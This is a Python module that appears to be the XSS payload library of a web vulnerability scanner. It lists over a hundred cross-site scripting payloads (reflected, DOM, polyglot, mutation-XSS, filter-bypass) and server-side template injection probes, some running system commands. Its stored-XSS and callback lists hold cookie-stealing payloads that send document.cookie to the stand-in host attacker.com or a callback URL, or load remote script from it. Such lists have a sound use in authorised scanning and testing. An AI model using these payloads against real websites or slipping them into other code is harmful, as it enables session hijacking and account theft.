"""
XSS payload library — P2 upgrade: 100+ payloads.
"""

import secrets
import string
from typing import List

REFLECTED_PAYLOADS: List[str] = [
    # Basic script tags
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>prompt(1)</script>",
    "<script>confirm(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    # IMG vectors
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=prompt(1)>",
    "<img src=1 onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<img src=x onerror=this.onerror=null;alert(1)>",
    # SVG vectors
    "<svg onload=alert(1)>",
    "<svg onload=alert('XSS')>",
    "<svg onload=prompt(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><set onbegin=alert(1) attributeName=x>",
    # Body/iframe
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<body onfocus=alert(1) autofocus>",
    "<iframe onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    # Input/Autofocus
    "<input onfocus=alert(1) autofocus>",
    "<input onfocus=prompt(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    # Details/Marquee
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<marquee onfinish=alert(1)>",
    # Video/Audio
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<video poster=javascript:alert(1)>",
    # Object/Embed
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    # Style / Link
    "<style>@import'javascript:alert(1)';</style>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    # Event handlers
    "<div onmouseover=alert(1)>",
    "<div onclick=alert(1)>",
    "<form action=javascript:alert(1)><button>click</button></form>",
    "<form><button formaction=javascript:alert(1)>click</button></form>",
    "<a href=javascript:alert(1)>click</a>",
    # Quote breakouts
    "'><script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "'><svg onload=alert(1)>",
    '"><svg onload=alert(1)>',
    "';alert(1)//",
    '";alert(1)//',
    "'>alert(1)</script>",
    # Template literals
    "${alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
    "{{7*7}}",
    # Angular/React
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
    # DOM clobbering
    "<form id=test><input name=parentNode>",
    # Null byte
    "<script>alert(1)</script>%00",
    "%00<script>alert(1)</script>",
    # Double encoding
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    # Unicode bypass
    "<scrİpt>alert(1)</scrİpt>",
    "<scrİpt>alert(1)</scrİpt>",
    # Mixed case
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRİPT>alert(1)</SCRİPT>",
    "<sCrIpT>alert(1)</sCrIpT>",
    # Without closing tags
    "<script>alert(1)",
    "<img src=x onerror=alert(1)",
    # JS URI schemes
    "javascript:alert(1)",
    "javascript:prompt(1)",
    "javascript:confirm(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    # Expression (IE)
    "expression(alert(1))",
    "x:expression(alert(1))",
    # CSS injection
    "background-image:url(javascript:alert(1))",
    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # On-window
    "onwheel=alert(1)",
    "onscroll=alert(1)",
    "onresize=alert(1)",
]

STORED_PAYLOADS: List[str] = [
    "<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>",
    "<script src=http://attacker.com/xss.js></script>",
    "<img src=x onerror=\"new Image().src='http://attacker.com/c?'+document.cookie\">",
    "<svg onload=\"fetch('http://attacker.com/?c='+document.cookie)\">",
    "<script>fetch('http://attacker.com/s?'+btoa(document.cookie))</script>",
]

DOM_PAYLOADS: List[str] = [
    "#<script>alert(1)</script>",
    "#<img src=x onerror=alert(1)>",
    "#<svg onload=alert(1)>",
    "#'><script>alert(document.domain)</script>",
    "#javascript:alert(1)",
    '#" onfocus=alert(1) autofocus ',
    "#' onfocus=alert(1) autofocus ",
]

ENCODED_PAYLOADS: List[str] = [
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
]

# ── Polyglot XSS Payloads ─────────────────────────────────────
# Payloads that execute across multiple contexts (HTML/attribute/JS/URL).
# One payload = test all contexts at once.

POLYGLOT_PAYLOADS: List[str] = [
    # Classic universal polyglot (html + attr + js + url)
    """jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e""",
    # Short polyglot: works in href/src/action + event handler
    """javascript:alert(1)<!--</script><img src=x onerror=alert(1)>--!>""",
    # Attribute-aware polyglot: breaks out of quoted/unquoted attr + HTML
    """\"autofocus onfocus=alert(1) x="\"""",
    """'autofocus onfocus=alert(1) x='""",
    # Template-literal + HTML mixed polyglot
    """${alert(1)}<img src=x onerror=alert(1)>""",
    # Multi-context: works in script block + HTML + CSS
    """</script><svg onload=alert(1)><!--</style>-->""",
    # Angular sandbox escape + HTML
    """{{constructor.constructor('alert(1)')()}}<img src=x onerror=alert(1)>""",
    # URL + JS context polyglot
    """javascript:alert(1)\"\"'--></script><img src=x onerror=alert(1)>""",
    # Shortest possible multi-context
    """<!--<img src=x onerror=alert(1)>--!>""",
    """<script>alert(1)</script><!--<img>-->""",
]

# ── Mutation XSS (mXSS) Payloads ─────────────────────────────
# Exploit browser parser mutations — innerHTML/setHTML re-parses DOM
# and the payload "mutates" into executable code.

MXSS_PAYLOADS: List[str] = [
    # Namespace mutation: <svg><style></style>
    "<svg><style></style><img src=x onerror=alert(1)>",
    # <noscript> mutation: contents become innerHTML in noscript-disabled browser
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    # <noembed> mutation (legacy IE/FF)
    '<noembed><p title="</noembed><img src=x onerror=alert(1)>">',
    # <math>x<style> mutation
    "<math><style><!--</style><img src=x onerror=alert(1)>-->",
    # <template> mutation (shadow DOM re-parsing)
    "<template><img src=x onerror=alert(1)></template>",
    # <select> + <script> mutation
    "<select><style></style><img src=x onerror=alert(1)>",
    # <form> + <isindex> mutation (legacy)
    "<form><isindex action=javascript:alert(1)>",
    # <details> + <style> mutation
    "<details open><style>/*</style><img src=x onerror=alert(1)>*/",
    # <table> + <style> mutation
    "<table><style></style><img src=x onerror=alert(1)>",
    # <textarea> + <style> mutation
    "<textarea><style></style><img src=x onerror=alert(1)>",
    # <title> + <style> mutation
    "<title><style></style><img src=x onerror=alert(1)>",
    # DOMPurify bypass v2: namespace confusion
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    # Mutation via <listing>
    "<listing><style></style><img src=x onerror=alert(1)>",
    # <xmp> legacy mutation
    "<xmp><style></style><img src=x onerror=alert(1)>",
]

# ── SSTI (Server-Side Template Injection) Payloads ────────────
# Tests for template engine injection in reflected/user-controlled output.

SSTI_PAYLOADS: List[str] = [
    # Generic template detection
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{7*'7'}}",
    # Jinja2 / Twig
    "{{config}}",
    "{{self}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    # FreeMarker
    "${7*7}",
    "${7*'7'}",
    # Velocity
    "#set($x=7*7)$x",
    # Jade / Pug
    "#{7*7}",
    # Smarty
    "{$smarty.version}",
    # ERB (Ruby)
    "<%= 7*7 %>",
    "<%= system('id') %>",
    # Tornado
    "{{7*7}}",
    # Angular
    "{{constructor.constructor('alert(1)')()}}",
    # Handlebars / Moustache
    "{{7*7}}",
    # Nunjucks
    "{{range(1,2)}}",
]

WAF_BYPASS_PAYLOADS: List[str] = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<scrİpt>alert(1)</scrİpt>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=prompt(1)>",
    "<svg/onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<script>confirm(1)</script>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "eval(atob('YWxlcnQoMSk='))",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
]

STORED_XSS_CALLBACK_PAYLOADS: List[str] = [
    "<script src='{callback_url}'></script>",
    "<img src=x onerror=\"var s=document.createElement('script');s.src='{callback_url}';document.body.appendChild(s);\">",
    "<svg onload=\"fetch('{callback_url}?c='+document.cookie)\">",
    "<script>new Image().src='{callback_url}?c='+document.cookie</script>",
]


def generate_stored_xss_marker(length: int = 12) -> str:
    """Generate a unique marker for stored XSS detection."""
    return "WVS_XSS_" + "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(length))
